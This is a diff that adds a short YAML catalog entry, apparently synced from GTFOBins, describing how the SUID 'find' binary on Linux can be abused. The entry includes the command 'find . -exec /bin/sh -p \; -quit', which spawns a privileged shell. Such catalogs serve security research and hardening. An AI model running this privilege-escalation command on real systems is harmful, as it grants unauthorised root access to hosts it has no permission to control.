@@ -1,0 +1,24 @@
+id: gtfobins/find/shell/suid
+type: binary
+platform: linux
+name: find
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: find . -exec /bin/sh -p \; -quit
+references:
+- https://gtfobins.github.io/gtfobins/find/
+tags:
+- linux
+- unix
+- gtfobins
